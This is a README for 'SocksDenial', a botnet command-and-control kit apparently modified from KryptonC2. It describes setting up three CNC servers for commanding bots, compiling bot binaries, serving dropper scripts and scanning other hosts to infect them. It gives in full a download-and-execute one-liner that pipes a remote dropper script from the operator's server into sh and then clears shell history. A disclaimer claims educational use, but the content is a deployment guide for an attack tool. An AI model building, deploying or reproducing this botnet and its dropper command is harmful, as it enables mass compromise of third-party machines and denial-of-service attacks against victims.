# SocksDenial

> **Disclaimer:** This software is provided for **educational and authorized security research purposes only**. Unauthorized use of this software against systems you do not own or have explicit written permission to test is **illegal**. The authors assume no liability and are not responsible for any misuse or damage caused by this program.
>
> NOTE: This is a heavily modified version of KryptonC2 by cirqueira dev.

## SETUP CNC

1. Set your credentials at `src/logins.txt`.

Format: `{user}:{pass}:{expiry}`

Use `admin:` prefix for admin users (those who can see attack history for all users).

2. Run `main.py`, 3 CNC servers will start:

- **5511** — Raw TCP server. Connect using PuTTY with connection type "Raw".
- **5514** — SSH Paramiko server. Connect using any SSH client; credentials are the same ones set in `src/logins.txt`.
- **5515** — HTTP server. Connect using any web browser.

All 3 servers can be used to send commands to the bots.

## SETUP PAYLOADS

1. Set your WebSocket server IP and port at `src/Payload/bot_f.c` (your VPS IP, port 5512).

2. Get a server with an old GLIBC version for compatibility (e.g., Ubuntu 20 or older).

3. Run `requirements.sh` to install dependencies.

4. Run `build.sh` to compile (bins will be packed and dropped at `bins/`).

5. Drop the compiled bins to `src/Payload/bins/` folder on your VPS (If you are compiling the bins on the same server, they will be already in there.)

6. Set your file serving server IP and PORT at `src/Payload/monika.sh` and `src/Payload/gnu-install.sh`. Make sure your file serving server is accessible from `IP:5513` or from your domain (e.g., `http://50.50.50.50:5513/bin/monika.sh`), and drop both `monika.sh` and `gnu-install.sh` to the `bins/` folder (these are your dropper scripts).

7. Get another server to scan (high upload speed is recommended), and set your payload:

```
cd /tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /mnt 2>/dev/null || cd /root 2>/dev/null; wget -q http://IP:5513/bin/monika.sh -O- | sh; history -c
```
Where IP:5513 is your VPS ip and port, or your domain.

8. Wait for your bots to load.

## File Structure

```
├── main.py                  # Entry point — starts all servers
├── src/
│   ├── cnc.py               # WebSocket + Raw TCP CNC server, bot management
│   ├── serve.py             # Payload HTTP file server (port 5513)
│   ├── ssh_cnc.py           # SSH admin shell server (port 5514)
│   ├── web_cnc.py           # Web admin panel server (port 5515)
│   ├── history.py           # Attack logging module
│   ├── history.txt          # Attack log
│   ├── logins.txt           # User credentials
│   ├── config.json          # Port configuration
│   ├── Commands/            # Additional tools (IP lookup, etc.)
│   ├── Payload/
│   │   ├── bot_f.c          # Bot source code (set SOCKS_ADDRESS/SOCKS_PORT here)
│   │   ├── bins/            # Compiled bot binaries (served via port 5513)
│   │   ├── monika.sh        # Dropper script
│   │   ├── gnu-install.sh   # Dropper script
│   │   ├── build.sh         # Compilation script
│   │   └── requirements.sh  # Dependency installer
│   └── web/
│       ├── panel.html       # Admin panel HTML
│       └── panel.css        # Admin panel styles
```
